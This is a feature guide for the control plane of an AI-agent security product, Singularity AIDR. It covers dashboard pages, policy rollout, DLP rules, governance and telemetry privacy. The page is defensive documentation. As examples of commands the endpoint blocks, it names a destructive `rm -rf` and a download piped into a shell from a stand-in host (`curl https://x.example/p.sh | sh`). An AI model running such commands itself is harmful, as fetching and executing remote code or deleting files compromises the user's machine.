# Singularity AIDR feature guide, part 3: control plane and deployment

Singularity AIDR enforces on the endpoint. Agent connectors and Browser Guard decide
`allow`, `ask` or `deny` locally, with no account and no network. The **control plane**
is an optional management layer on top of that. It gives you a web console, identities
and roles, signed enrollment, central policy, telemetry, audit export, and the plan and
licence records that decide how many endpoints may report to it. This part covers every
control-plane feature and each way to deploy it: SaaS, customer-operated on Docker
Compose or Kubernetes, and air-gapped.

> **Release status.** Singularity AIDR is not yet released for customer use; the release
> record is [first-customer-ready.md](../../../production-readiness/first-customer-ready.md).
> The hosted service is not yet accepted for customer use, and every self-hosted
> installation still needs its own rehearsal and acceptance. This guide says what the
> software does and how to operate it. It does not promise availability, an SLA or a
> supported sale. Pricing is by quote: anil@singularityrd.com.

## Contents

1. [How the control plane fits](#1-how-the-control-plane-fits)
2. [Dashboard: route map](#2-dashboard-route-map)
3. [Dashboard features](#3-dashboard-features)
   - [Onboarding (Connect)](#onboarding-connect)
   - [Downloads center](#downloads-center)
   - [Dashboard overview](#dashboard-overview)
   - [Events](#events)
   - [Incidents and evidence chain](#incidents-and-evidence-chain)
   - [Agents and agent detail](#agents-and-agent-detail)
   - [Discovery coverage](#discovery-coverage)
   - [AI Security Posture](#ai-security-posture)
   - [Team policy and runtime policy](#team-policy-and-runtime-policy)
   - [Staged policy rollout and rollback](#staged-policy-rollout-and-rollback)
   - [DLP policy editor](#dlp-policy-editor)
   - [Browser Privacy](#browser-privacy)
   - [AI governance: asset register, intake, exceptions and change control](#ai-governance-asset-register-intake-exceptions-and-change-control)
   - [Governance scorecard, framework mapping and scheduled summary](#governance-scorecard-framework-mapping-and-scheduled-summary)
   - [AutoSecOps view and response playbooks](#autosecops-view-and-response-playbooks)
   - [API keys and enrollment tokens](#api-keys-and-enrollment-tokens)
   - [Team, roles and invitations](#team-roles-and-invitations)
   - [Workspace settings: name, retention, closure](#workspace-settings-name-retention-closure)
   - [Billing and plan](#billing-and-plan)
4. [Identity and access](#4-identity-and-access)
   - [Single sign-on: Microsoft Entra ID and SAML 2.0](#single-sign-on-microsoft-entra-id-and-saml-20)
   - [SCIM directory provisioning](#scim-directory-provisioning)
   - [Multi-factor authentication, recovery and session revocation](#multi-factor-authentication-recovery-and-session-revocation)
   - [Device-code enrollment](#device-code-enrollment)
5. [Multi-tenancy and isolation](#5-multi-tenancy-and-isolation)
6. [Plans, trial and admission](#6-plans-trial-and-admission)
   - [Plan catalog and plan x feature matrix](#plan-catalog-and-plan-x-feature-matrix)
   - [Trial and tenant admission](#trial-and-tenant-admission)
   - [Payment paths: invoice and card](#payment-paths-invoice-and-card)
   - [Operator administration (operator-admin)](#operator-administration-operator-admin)
7. [Telemetry and its privacy](#7-telemetry-and-its-privacy)
8. [Audit export and SIEM delivery](#8-audit-export-and-siem-delivery)
   - [Audit export (CSV and JSON)](#audit-export-csv-and-json)
   - [SIEM delivery](#siem-delivery)
   - [Compliance evidence report](#compliance-evidence-report)
   - [Alert integrations: Slack, Teams, signed webhooks and e-mail](#alert-integrations-slack-teams-signed-webhooks-and-e-mail)
9. [Retention, legal hold and offboarding](#9-retention-legal-hold-and-offboarding)
10. [Backups and restore drills](#10-backups-and-restore-drills)
11. [Monitoring and alerts](#11-monitoring-and-alerts)
12. [Deployment options](#12-deployment-options)
    - [Local mode (no control plane)](#local-mode-no-control-plane)
    - [Cloud (SaaS)](#cloud-saas)
    - [On-premises with Docker Compose](#on-premises-with-docker-compose)
    - [Kubernetes with Helm](#kubernetes-with-helm)
    - [Air-gapped installation](#air-gapped-installation)
    - [Signed offline licence](#signed-offline-licence)
    - [TLS options](#tls-options)
    - [Upgrade and rollback](#upgrade-and-rollback)
    - [Resource sizing](#resource-sizing)
13. [Deployment x feature matrix](#13-deployment-x-feature-matrix)
14. [Related documents](#14-related-documents)

**How to read the availability tables.** The plan column follows the plan catalog in
`packages/dashboard/src/billing/plans.ts` (mirror of `public.plans`). That catalog is a
commercial list. Today the software enforces only the admitted **agent capacity** of a
tenant. It does not switch individual features on or off by plan, so the plan column
tells you what is sold with a plan, not a technical lock. "Local" means an endpoint with
no control plane. "Cloud" is the SaaS option. "On-prem" covers Docker Compose and
Kubernetes. "Air-gapped" is an on-prem installation with no internet access.

---

## 1. How the control plane fits

```
 Endpoint (developer machine, browser)             Control plane (Cloud or customer-operated)
 +----------------------------------+              +----------------------------------------+
 | Connector or Browser Guard       |  enrollment  | Dashboard (web console)                |
 |  - local detection and policy    | <----------- | Edge Functions: enroll, policy, ingest,|
 |  - local audit log               | signed policy|   audit-export, scim, operator-admin   |
 |  - redacted events / counts ---->| -----------> | Postgres with row-level security       |
 +----------------------------------+              +----------------------------------------+
         keeps enforcing if the control plane is unreachable (signed cached state)
```

- **Enforcement never moves to the server.** Connectors evaluate every tool call on
  the endpoint. The default configuration is `mode: "local"`.
- **The control plane adds management.** It provides identities, roles, signed
  enrollment, central runtime and DLP policy, telemetry views, audit export, plan and
  licence records.
- **It is one code base in every deployment.** Cloud, Compose and Helm run the same
  129 database migrations (`supabase/migrations/`) and the same Edge Functions
  (`supabase/functions/`).
- **Offline behaviour.** An enrolled endpoint keeps enforcing with its signed cached
  state when the control plane is unreachable. Managed entitlement checks use
  `control_plane.grace_period_hours` (72 by default). If you set
  `control_plane.remote_policy_required: true`, a stale central policy is tolerated
  for `control_plane.remote_policy_offline_grace_seconds` (3,600 by default). After
  that, protected operations are **blocked** until the policy refreshes. This is a
  deliberate fail-closed choice for customers who require central policy.

---

## 2. Dashboard: route map

The console is a React application (`packages/dashboard`). Every signed-in route checks
the session and redirects to `/login` if it has expired. An idle session also ends
locally after an inactivity timeout. The routes are declared in
`packages/dashboard/src/main.tsx`:

| Route | Navigation label | What it is for | Section |
| --- | --- | --- | --- |
| `/onboarding` | Connect | Create a workspace, start a trial, choose a runtime, authorize a device | [Onboarding](#onboarding-connect) |
| `/downloads` | Downloads | Download connectors with verified SHA-256 digests | [Downloads center](#downloads-center) |
| `/dashboard` | Dashboard | Fleet counters, live agents, recent events | [Dashboard overview](#dashboard-overview) |
| `/billing` | Billing | Current plan, admitted agents, plan change request, invoices | [Billing and plan](#billing-and-plan) |
| `/api-keys` | API Keys | Tenant API keys and one-time enrollment tokens | [API keys](#api-keys-and-enrollment-tokens) |
| `/agents`, `/agents/:agentId` | Agents | Enrolled installations, seat usage, per-agent events | [Agents](#agents-and-agent-detail) |
| `/events` | Events | Latest 500 reported verdict events | [Events](#events) |
| `/discovery` | Discovery | Reported AI-infrastructure collectors and targets | [Discovery coverage](#discovery-coverage) |
| `/posture` | Posture | Infrastructure CVEs, MCP risks, skill findings | [AI Security Posture](#ai-security-posture) |
| `/incidents` | Incidents | Blocked and approval-required verdicts, evidence chain | [Incidents](#incidents-and-evidence-chain) |
| `/approvals` | Approvals (pending-count badge for owners and admins) | Decide managed-mode `ask` requests with a reason | [Dashboard approvals](01-ai-agent-security.md#dashboard-approvals) |
| `/privacy-guard` | Browser Privacy | Browser Guard counts and browser enrollment | [Browser Privacy](#browser-privacy) |
| `/autosecops` | AutoSecOps | Runtime fleet view from the AutoSecOps integration | [AutoSecOps](#autosecops-view-and-response-playbooks) |
| `/settings` | Settings | Workspace name, retention, closure, alert notifications, MFA status, theme | [Workspace settings](#workspace-settings-name-retention-closure), [Alert integrations](#alert-integrations-slack-teams-signed-webhooks-and-e-mail) |
| `/team` | Team | Members, roles, invitations, team audit and export | [Team](#team-roles-and-invitations) |
| `/scim` | Directory provisioning (owners only) | SCIM credentials and group-to-role mappings | [SCIM](#scim-directory-provisioning) |
| `/policies` | Policies (roles that can edit policy) | Team policy, runtime policy, rollout, DLP editor | [Policies](#team-policy-and-runtime-policy) |
| `/compliance` | Compliance (owners and admins) | Compliance evidence report (hash-sealed, optionally signed): JSON, CSV bundle, printable EN/TR | [Compliance evidence report](#compliance-evidence-report) |
| `/governance` | Governance (owners and admins) | Governance scorecard, framework control matrix, scheduled summary settings | [Governance scorecard](#governance-scorecard-framework-mapping-and-scheduled-summary) |
| `/governance/register` | AI register | AI asset register | [AI governance](#ai-governance-asset-register-intake-exceptions-and-change-control) |
| `/governance/requests`, `/governance/change-control` | (from the AI register) | Intake requests and exceptions; four-eyes policy change control | [AI governance](#ai-governance-asset-register-intake-exceptions-and-change-control) |
| `/enterprise` | none (link in the invitation) | Invitation acceptance | [Team](#team-roles-and-invitations) |
| `/auth/dlp-step-up` | none | MFA step-up before DLP and workspace changes | [MFA](#multi-factor-authentication-recovery-and-session-revocation) |
| `/auth/recover` | none | Password recovery and break-glass recovery codes | [MFA](#multi-factor-authentication-recovery-and-session-revocation) |

Public pages that need no sign-in: `/` (landing), `/pricing` (the **Editions** page,
rendered from the price-free catalog mirror, with a quote request to
anil@singularityrd.com instead of prices), `/pilot` (pilot application), `/verify`
(device-code approval),
`/support`, `/status`, `/privacy`, `/security`, `/terms`, and `/login`.

---

## 3. Dashboard features

### Onboarding (Connect)

**What it does.** `/onboarding` walks a new owner through a first protected agent. You
create a team workspace, start the 14-day trial where it is offered, then complete three
steps: **1) Choose runtime**, **2) Download & connect**, **3) Authorize**.

**Why it matters.** Most failed rollouts stall between "installed" and "reporting". This
page pairs the right connector download with a device code for the same team, so the
first endpoint lands in the correct tenant with a signed configuration.

**How it works.** The page reads the workspace's admission state. It then shows the
trial offer (cloud admission mode, owner role, one trial per user) or the access status.
It embeds the [downloads center](#downloads-center) filtered to the chosen runtime. From
step 3 you can create a device code (`device-start`) or a manual enrollment token. The
page is disabled for roles that cannot enroll agents.

**How to use.**
1. Sign in and open **Connect** (`/onboarding`).
2. If you have no workspace yet, enter a name under **Create your team workspace**.
3. If offered, tick the Terms and Privacy acknowledgement (the versions your operator
   recorded) and press **Start 14-day trial · 1 agent**.
4. Pick the runtime, download and verify the installer, and install it.
5. When the agent prints a code, approve it on `/verify`. Generate a code here only if
   you need a manual enrollment token.

**Example.** An owner creates the workspace "Acme Platform", starts the trial, picks
**Codex CLI**, installs it and approves the code the agent shows. The agent then
appears on `/agents` with runtime `codex`.

**Availability.**

| Plan | Deployment | Platforms / OS |
| --- | --- | --- |
| All plans (catalog feature `dashboard`). The trial is cloud only. | Cloud, On-prem, Air-gapped | Web console in a current browser; connectors per their own guides |

**Limitations.** The trial button appears only in `cloud` admission mode, only to
owners, and only if the user has not used a trial before. Connector installation itself
is still a per-runtime step, and a universal MDM installer is not shipped.

### Downloads center

**What it does.** `/downloads` lists the connector packages of the published release:
Claude Code, Cursor, VS Code, OpenClaw, OpenCode, Codex CLI, the AIDR CLI, Browser Guard
for Chrome and Edge, Browser Guard for Firefox, and the MCP gateway. Each entry shows
its file name, size and SHA-256 digest, and marks the runtime as detected once one of
its agents has checked in.

**Why it matters.** A tampered installer can defeat a security product before it
starts. The center gives administrators the exact digest and copy-paste verification
commands, and it shows nothing it cannot verify.

**How it works.** The console loads a release manifest, either from the dashboard
server (`AIDR_RELEASE_MANIFEST_PATH`) or from an external HTTPS URL
(`VITE_AIDR_RELEASE_MANIFEST_URL`). It validates the manifest in the browser as well:
an `http:` link, a missing digest, an unknown field or a manifest over 1 MiB rejects it.
If a detached signature is published, it links to it.

**How to use.** Open **Downloads**, pick a runtime, download the file and run the shown
command under **Verify the download before installing**. Do not install if the check
fails.

**Example.** The Firefox entry shows `SHA-256 3f…`. The administrator runs the listed
`sha256sum` command, the digests match, and the file is pushed through browser policy.
If the manifest URL were plain `http:`, the page would say "The release manifest URL is
not an HTTPS or same-origin address, so downloads are withheld."

**Availability.**

| Plan | Deployment | Platforms / OS |
| --- | --- | --- |
| All plans | Cloud, On-prem, Air-gapped (manifest served by your own dashboard server) | Web console; downloads for Windows, macOS and Linux per connector |

**Limitations.** A digest proves integrity against the manifest, not publisher
identity. Notarization, code signing and MDM acceptance remain external steps. If no
manifest is configured, the page shows "No verified download is available for this
deployment."

### Dashboard overview

**What it does.** `/dashboard` is the landing page after sign-in. It shows counters for
agents, connected agents, pending enrollment tokens, events, deny and ask. It also
lists the five most recent live agents and the six latest events, next to shortcuts to
**Connect agent**, **Verify code** and **Privacy settings**.

**Why it matters.** A security lead needs to see at a glance whether endpoints are
reporting and whether blocks are rising, without opening each agent.

**How it works.** The counters read the tenant's `agents` and `events` rows under
row-level security. Event-based counters cover the latest 500 events and are labelled
that way. "Latest heartbeat" is the newest `last_seen` of any agent.

**How to use.** Open **Dashboard**. Use **Connect agent** to enroll more endpoints and
**Verify code** to approve a device code.

**Example.** After a policy change the **Deny** tile rises from 3 to 41 within the
latest 500 events. The reviewer opens **Events** to see which tool was blocked.

**Availability.**

| Plan | Deployment | Platforms / OS |
| --- | --- | --- |
| All plans | Cloud, On-prem, Air-gapped | Web console |

**Limitations.** The counters are a window over the latest 500 events, not a complete
history. `allow` verdicts appear only if endpoints send clean verdicts
(`control_plane.send_clean_verdicts: true`).

### Events

**What it does.** `/events` lists the latest 500 events from the team's agents with
time, agent, type, verdict and summary. Badges total the deny, ask and allow verdicts.

**Why it matters.** It is the first place to check whether a block was expected, for
example a destructive `rm -rf` or a download piped into `sh`.

**How it works.** Endpoints in managed mode send redacted `runtime_verdict` events to
the `ingest` function (see [telemetry](#7-telemetry-and-its-privacy)). With default
reporting, `ask` and `deny` are uploaded. `allow` needs clean-verdict reporting. Summaries
show only fields that survived redaction. With the default `redact_mode: "hash"`,
command and URL text is replaced by SHA-256 digests.

**How to use.** Open **Events** and press **Refresh**. To also collect `allow` verdicts,
set `control_plane.send_clean_verdicts` to `true` in the endpoint configuration.

**Example.** A row reads `runtime_verdict` · `deny` · `Bash: deny` for agent
`dev-laptop-17`. The command text itself is not shown because the endpoint hashed it.

**Availability.**

| Plan | Deployment | Platforms / OS |
| --- | --- | --- |
| All plans | Cloud, On-prem, Air-gapped | Web console |

**Limitations.** The page covers 500 events. Use the [audit export](#8-audit-export-and-siem-delivery)
or SIEM delivery for longer history. Event visibility depends on endpoint reporting
settings.

### Incidents and evidence chain

**What it does.** `/incidents` shows possible incidents derived from received blocked
(`deny`) and approval-required (`ask`) verdicts, plus plugin scan findings. Below the
list, the **Evidence chain** groups records by agent and correlation id, so a
multi-step response, including any rollback step, reads in order.

**Why it matters.** During an investigation you need the sequence of what happened on
one device, not a flat log. You also need to know whether the evidence has left the
device for independent custody.

**How it works.** The page reads the `incident_events` view and recent events. The
evidence view orders records by the per-device logical counter, not the host clock.
Clock skew that no record reported is shown as *not reported*, never as in sync. A
chain head counts as `anchored` only when an archive returned proof for that digest.
Without a configured archive sink it says `unanchored` (`no_archive_sink`).

**How to use.** Open **Incidents**, review the blocked and approval-required counts,
and expand an evidence group for the device and correlation id you are investigating.
Approvals for `ask` happen out of band with the operator CLI (`aidr pending`,
`aidr approve <actionId>`), never from the console or the agent.

**Example.** An agent tries `curl https://x.example/p.sh | sh`. The endpoint blocks it
and reports `deny`. The incident list shows "1 blocked", and the evidence chain shows
the verdict record with its device counter and "unanchored".

**Availability.**

| Plan | Deployment | Platforms / OS |
| --- | --- | --- |
| All plans | Cloud, On-prem, Air-gapped | Web console |

**Limitations.** Counts cover the latest 500 events, not the full local incident
history. The schema has no tenant-scoped incident record table yet, so incidents are
derived from telemetry. Evidence is local-record custody unless an archive sink is
configured.

### Agents and agent detail

**What it does.** `/agents` lists every known installation (unique install id, `iid`)
with name, runtime, runtime version and last-seen time. It also shows allowed versus
recorded agents. `/agents/:agentId` shows one agent with its entitlement snapshot (tier,
allowed agents, expiry) and its recent events.

**Why it matters.** Seats are counted per agent. Admins need to see which installations
consume capacity, which have gone silent, and whether an endpoint holds a current
entitlement.

**How it works.** Rows come from `agents` and the `seat_usage` view under row-level
security. If seat usage cannot be read, the page says so. It does not guess the limit.
A browser profile running Browser Guard counts as an agent seat like any connector.

**How to use.** Open **Agents** and choose **View** on a row for detail and events. To
add agents, use **Onboarding**.

**Example.** "Allowed: 25. Recorded: 25." A 26th endpoint then tries to report and gets
`402 agent_limit_exceeded` from ingest. Its events are not stored.

**Availability.**

| Plan | Deployment | Platforms / OS |
| --- | --- | --- |
| All plans | Cloud, On-prem, Air-gapped | Web console |

**Limitations.** "Last seen" reflects reported check-ins. It is not proof that the
host is enforcing. Use host-specific canaries for that.

### Discovery coverage

**What it does.** `/discovery` summarizes what your **reported collectors** have seen of
your AI infrastructure. It shows the number of collectors and targets, stale collectors
and targets, unreachable and never-seen targets, and partial and not-reported
collectors. Per collector it lists target freshness, reachability and alert state.

**Why it matters.** Self-hosted inference servers and AI apps (Ollama, vLLM, ComfyUI,
Gradio and similar) appear quickly and are often unpatched. You need to know which ones
are watched and whether the watching has stopped.

**How it works.** The AIDR CLI runs `aidr collect` on a schedule and posts discovery
cycles to the `discovery` function. Each cycle carries a sequence number, stale-after
time and bounded target list (1 to 100 expected targets). An owner or admin at AAL2
issues a collector credential through the `discovery` function (`issue_credential`,
30 days by default, 90 at most).

**How to use.**
```sh
export AIDR_DISCOVERY_URL=https://api.aidr.example.com/functions/v1/discovery
export AIDR_DISCOVERY_ANON_KEY=<project anon key>
export AIDR_DISCOVERY_COLLECTOR_CREDENTIAL=<collector credential>
aidr collect --tenant <tenant-uuid> --file targets.txt --interval 900 --stale-after 15
```
Targets are limited to loopback and private addresses unless you pass `--allow-public`.

**Example.** A collector reports eight targets. One stops answering, so after 15
minutes it is marked stale and unreachable, and the alert state changes on the page.

**Availability.**

| Plan | Deployment | Platforms / OS |
| --- | --- | --- |
| Not a separate catalog line; shown with the dashboard | Cloud, On-prem, Air-gapped | AIDR CLI on Windows, macOS or Linux; web console |

**Limitations.** The page states it itself: it covers reported collectors only and does
not establish complete discovery of your cloud, MDM or estate. Only the `local`
provider is implemented; cloud and MDM providers need an adapter.

### AI Security Posture

**What it does.** `/posture` answers three questions for the last 90 days. Which AI
infrastructure has known vulnerabilities? Which MCP servers are configured, and how risky
are they? Which skill or plugin packages contain dangerous patterns? It shows tiles for
critical CVEs, high CVEs, MCP servers and skill findings, then tables for
**Infrastructure exposure**, **MCP inventory risks**, **Skill and plugin findings**
and a 30-day **Trend**. It also shows an **Agent environment and autonomy** table
(from `aidr discover --agents --upload`), the OWASP and MITRE ATLAS
[framework coverage](01-ai-agent-security.md#security-framework-coverage-owasp-mitre-atlas)
of the rules, and an **Export AI-BOM** button for a tenant-wide CycloneDX 1.6 document
([AI-BOM](01-ai-agent-security.md#ai-bom-ai-bill-of-materials)).

**Why it matters.** An agent is only as safe as the servers and tools it talks to. An
exposed inference server with a known CVE, or an MCP server that wraps a shell, widens
what a prompt-injected agent can reach.

**How it works.** Three local, deterministic scanners built into the AIDR CLI, backed by
a vulnerability and fingerprint dataset that ships with AIDR:

| Scanner | Command | Data behind it (counted in this repository) |
| --- | --- | --- |
| Infrastructure exposure | `aidr scan --target <url>` or `--file targets.txt` | 146 AI component fingerprints (inference servers, agent frameworks, AI apps); 2,014 CVE rule files for 116 components, compiled to 2,017 advisory entries across 127 products, each with a severity and, where published, a CVSS score |
| MCP inventory | `aidr discover [--config <path>...]` | Local MCP configuration files plus 14 MCP risk categories (`mcp-01` to `mcp-14`, such as token exposure, tool poisoning, command injection and tool shadowing) |
| Skill and plugin packages | `aidr scan --skill <dir>`, plus every session-start plugin scan | 26 deterministic rules in `threats/skill-scan.yaml` for the T01-T09 taxonomy |

With `--upload`, findings go to ingest using the installation's enrolled API key. A
database trigger projects them into `public.posture_findings`. Only identifiers,
severities, component versions and digests leave the machine. Target URLs, host names,
file paths, matched text, MCP commands, arguments and credentials never do. Optional
deep scans run in a separate loopback bridge service, deployed as an optional sidecar (see
[Compose](#on-premises-with-docker-compose)).

**How to use.**
```sh
aidr scan --target http://10.0.0.5:11434 --upload
aidr scan --skill ~/.claude/skills/my-skill --upload
aidr discover --upload
```
Critical or high findings exit with `2`, so you can use the scan in CI. Unreadable
paths exit with `1` as incomplete coverage.

**Example.** `aidr scan --target http://10.0.0.5:11434 --upload` identifies an Ollama
version with a critical advisory. On `/posture` the CVE appears under **Infrastructure
exposure** with its CVSS, "confirmed" applicability and "1 target". The IP address is
not shown because only its digest was sent.

**Availability.**

| Plan | Deployment | Platforms / OS |
| --- | --- | --- |
| Business, Enterprise (catalog feature `ai_security_posture`) | Cloud, On-prem, Air-gapped (scan internal targets) | AIDR CLI on Windows, macOS or Linux; web console |

**Limitations.** Detection only: posture never changes runtime verdicts. Coverage is
limited to the compiled fingerprint and CVE dataset and to reachable, identified
targets. A target that could not be reached is "not scanned", never clean. MCP
discovery reads local configuration files only. Skill rules are deterministic patterns;
there is no LLM-based review stage. An empty page means nothing was uploaded, not that the estate is
clean.

### Team policy and runtime policy

**What it does.** `/policies` is policy as code for enrolled agents. The **Security
Policy Editor** stores strict YAML team policy documents with validation. **Runtime
policy** publishes the compiled JSON controls that connectors fetch: default actions per
artifact type and MCP server and tool lists.

**Why it matters.** Local rules catch known-bad behaviour. Central policy lets a
security team set organisation-wide defaults, for example "ask before any unknown MCP
server" or "deny writes outside the repository", and change them without touching
every laptop.

**How it works.** The `policy-management` function reads the newest stored document and
compiles only supported controls. It then returns an explainable dry run or publishes a
signed runtime policy revision. Unsupported fields fail compilation. Supported actions
are `command_default`, `file_default`, `url_default`, `package_default`,
`output_default`, `mcp_default`, `mcp_unknown` and `mcp_risky`. MCP lists are
`mcp_allow_servers`, `mcp_require_approval_servers`, `mcp_deny_servers` and the
corresponding `*_tools` lists. Stale writes return `409`. Connectors fetch the published
controls on their next refresh and report a load receipt.

**How to use.** Open **Policies**. Owners, admins and members can write and save YAML
drafts. Owners and admins then run **Compile saved YAML (dry run)**, review the result,
and press **Compile and publish saved YAML** or **Publish runtime policy JSON**.

**Example.** You publish `{"mcp_unknown": "ask"}`. The next time an agent calls a tool on
an MCP server outside the allow list, the connector blocks it pending out-of-band
approval, and the model sees only the block reason with an action id.

**Availability.**

| Plan | Deployment | Platforms / OS |
| --- | --- | --- |
| All plans (owners and admins publish) | Cloud, On-prem, Air-gapped | Web console; enforced by enrolled connectors |

**Limitations.** Publication does not confirm that every agent adopted the version. Load
receipts are agent-reported, not proof that the host enforced the policy. Detection
rules still apply when a default is `allow`.

### Staged policy rollout and rollback

**What it does.** Under the runtime policy editor, **Policy rollout** lets you stage the
current draft for selected agents, or start an **ordered canary rollout**. It also keeps
**revision history** for review and republishing.

**Why it matters.** A policy that is too strict can stop developer work across the
fleet. Canarying on a few agents first catches that before everyone is affected.

**How it works.** A rollout plan (tables `policy_rollouts` and `policy_rollout_batches`)
orders non-overlapping batches (rings). The first selected agent is the canary. The
remaining agents receive the revision only after the canary reports a fresh load
receipt. The tenant policy stays the fallback while a rollout runs. Receipts older than
five minutes are marked stale. Staging or republishing cancels any active ordered
rollout.

**How to use.** On **Policies → Policy rollout**, tick up to 200 agents, then press
**Stage current draft for N selected agents** or **Start ordered canary rollout for N
selected agents**. To roll back, choose **Review version N** in the history and publish
that revision again.

**Example.** Status reads: "Latest ordered rollout: version 12, running; agent-reported
loads 1/5 current, 0 stale, 4 outdated, 0 unknown." After the canary's receipt, the
next batch receives version 12.

**Availability.**

| Plan | Deployment | Platforms / OS |
| --- | --- | --- |
| All plans (owners and admins manage rollout) | Cloud, On-prem, Air-gapped | Web console |

**Limitations.** One request accepts up to 1,667 agents and must fit in 64 KB. The
screen stages up to 200 at a time and pages 500 agents. Progress is agent-reported and
is not host-enforcement attestation. Rollback means republishing an earlier revision.
No step happens on its own schedule.

### DLP policy editor

**What it does.** The **DLP policy editor** on `/policies` authors a tenant
data-loss-prevention document. It holds labels, matching rules (`keyword` or `regex`
matchers, `any` or `all`), rule actions (`redact`, `block`, `ask`) and time-bounded
exceptions.

**Why it matters.** It lets you add organisation-specific detectors, such as project
code names or internal customer id formats, to what agents may send or write.

**How it works.** The server validates the engine schema and tenant ownership before it
saves to `tenant_dlp_policies`. Reads and saves need MFA (AAL2) and use the
`/auth/dlp-step-up` page. Only an owner or admin can save. `ask` means "block pending
out-of-band operator approval". The editor has no approve or dismiss control.

**How to use.** Verify with your authenticator when asked. Add labels, rules and
exceptions, check the validated JSON preview, then save.

**Example.** A rule "Customer ID" with regex `ACME-[0-9]{8}` and action `block`. Once the
saved revision reaches the endpoint through the signed provisioning path, a tool call
whose input contains `ACME-12345678` is blocked.

**Availability.**

| Plan | Deployment | Platforms / OS |
| --- | --- | --- |
| All plans (owners and admins save) | Cloud, On-prem, Air-gapped | Web console |

**Limitations.** Saving is not delivery: the signed provisioning path must distribute a
saved revision separately. Current connector hooks inspect tool **input** before
execution only. Output-direction rules are not enforced there, and a `redact` match is
blocked rather than rewritten.

### Browser Privacy

**What it does.** `/privacy-guard` reports what Browser Guard masked, warned about or
blocked before it reached AI chat products, over 7 or 30 days. The tiles are **Prompts
protected**, **Items masked**, **Blocked sends** and **Active browser installs**. The
page also shows breakdowns by entity type and AI site, a daily series, the latest 25
scans (counts only) and an **Enroll browsers** helper that produces managed policy JSON.

**Why it matters.** It shows a CISO how often staff paste personal data or secrets into
ChatGPT, Gemini, Claude, Copilot or similar products, without collecting the text itself.

**How it works.** Enrolled browser profiles send `privacy_scan` events under the fixed
[telemetry contract](../../../contracts/privacy-telemetry.md). Ingest keeps only site,
action, channel (`prompt`, `paste`, `file`), per-type counts, finding count, an optional
policy id and the timestamp. Anything else is discarded. The page reads aggregates with
`public.privacy_guard_summary(tenant, 7 | 30)` under row-level security.

**How to use.**
1. Deploy the Browser Guard package to Chrome, Edge or Firefox.
2. Create a write-capable tenant API key on **API Keys**.
3. On **Browser Privacy → Enroll browsers**, choose the guard mode (`auto`, `confirm`,
   `block` or `monitor`), copy the policy JSON, replace the `apiKey` placeholder and push
   it through your browser management tool. Samples are in
   [deploy/browser-guard](../../../../deploy/browser-guard/README.md).

**Example.** Over 30 days: 1,240 prompts protected, 3,905 items masked, 18 blocked sends,
and 212 active installs of 240 enrolled. The top entity type is `EMAIL`, the top site
`chatgpt`.

**Availability.**

| Plan | Deployment | Platforms / OS |
| --- | --- | --- |
| Team, Business, Enterprise (catalog feature `browser_privacy_guard`) | Cloud, On-prem, Air-gapped | Chrome, Edge, Firefox; web console |

**Limitations.** Enrollment only adds reporting. Detection and masking run locally
whether or not a browser is enrolled. Each enrolled profile consumes an agent seat.
Privacy scans are not part of the audit export.

### AI governance: asset register, intake, exceptions and change control

**What it does.** Records which AI systems are in use, who owns them and why, who may use
which AI and who approved it, which exceptions are in force until when, and who changed
security policy with whose approval. Pages: **AI register** (`/governance/register`),
**Requests & exceptions** (`/governance/requests`) and **Change control**
(`/governance/change-control`).

**Why it matters.** Security, data-protection and AI governance boards ask these questions
under frameworks such as the EU AI Act, GDPR and KVKK. The answers should come from one
record that also drives enforcement where it can.

**How it works.**
- **Asset register.** One entry per coding agent, MCP server, AI chat site or model
  service: owner, business purpose, data categories (personal, special category, source
  code, secrets, customer data), an EU AI Act-style risk tier, status (proposed, approved,
  restricted, banned, retired), next review date and linked evidence (posture findings,
  incidents, approval requests). **Import observed AI systems** adds a `proposed` entry for
  each agent, MCP server, AI site and model endpoint the control plane has seen.
- **What a status enforces.** A banned MCP server is blocked by every managed connector
  (`deny`); a restricted one needs out-of-band approval (`ask`). The lists reach
  connectors next to the published runtime policy, digest-checked, at the next policy
  refresh. A banned AI chat site is listed in a **Browser Guard managed-policy snippet**
  (`blockedSites`) that the administrator deploys through browser management; Browser
  Guard does not fetch it by itself. Anything else is recorded only. The register only
  adds restrictions; it never relaxes a published policy.
- **Intake.** Owners, admins and members request a new AI tool or a status change with a
  purpose and the data involved. Owners, admins or designated reviewers decide with a
  reason, and never the requester (enforced by the database).
- **Time-boxed exceptions.** A waiver of a ban or restriction for named members, agents or
  everyone, with a justification and an end date within 365 days, approved by an owner or
  admin other than the requester. The end date is checked on every policy fetch, so an
  expired exception stops applying on its own.
- **Four-eyes change control.** While on, publishing runtime or DLP policy, rollbacks,
  staged rollouts and relaxing a register status become change requests that a second
  owner or admin approves after reviewing the diff. The database enforces it; turning it
  off is itself a change request.
- Every change needs multi-factor verification and is written to the audit log in the same
  transaction.

**How to use.** Open **AI register**, choose **Import observed AI systems**, then assign
owners and review dates. Turn on four-eyes on **Change control** (needs two active
owners or admins). Details: [ai-governance.md](../../../ai-governance.md).

**Example.** An administrator bans the `shell-runner` MCP server. Within the next policy
refresh every managed agent in the workspace is denied calls to it. A developer requests an
exception for a migration; another administrator approves it for three named members until
month end, after which it stops applying without anyone intervening.

**Availability.**

| Plan | Deployment | Platforms / OS |
| --- | --- | --- |
| Free, Team, Business, Enterprise (dashboard) | Cloud, On-prem, Air-gapped | Web console; enforcement on managed connectors |

**Limitations.** MCP enforcement needs a published runtime policy and connectors that
understand the governance block. Site bans reach browsers only when the administrator
deploys the policy snippet. Review reminders are shown in the dashboard only. The register
is a record-keeping and control tool, not a statement of legal compliance.

### Governance scorecard, framework mapping and scheduled summary

**What it does.** **Governance** (`/governance`, owners and admins) shows a scorecard for a
7, 30 or 90-day window: top risks, framework coverage, AI usage, agent decisions, human
oversight, incidents and posture, Browser Guard and acceptable-use coverage, policy
freshness, and a control matrix for NIST AI RMF, ISO/IEC 42001, the EU AI Act and
KVKK/GDPR. A weekly or monthly e-mail summary can be scheduled.

**Why it matters.** Executives and governance teams need a periodic, evidence-based view of
AI use and of the controls in place, without reading raw events.

**How it works.**
- **Framework mapping** is data (`governance/frameworks/*.yaml`): each control lists the
  product capabilities that support it, the evidence source, a coverage level (full,
  partial or customer responsibility) and a note stating the limit of the support. A
  capability counts as deployed only from observable signals in the workspace.
- **Human oversight**: approval requests, approve/deny ratio, median and 90th-percentile
  decision time, expired requests and a per-approver table. An approver who approves most
  requests within seconds is marked *Review pattern*, a prompt to check for automatic
  approval, not a finding about the person.
- The scorecard is computed by a database function from the workspace's own records and
  returns counts, dates and versions only, never prompt text or event payloads.
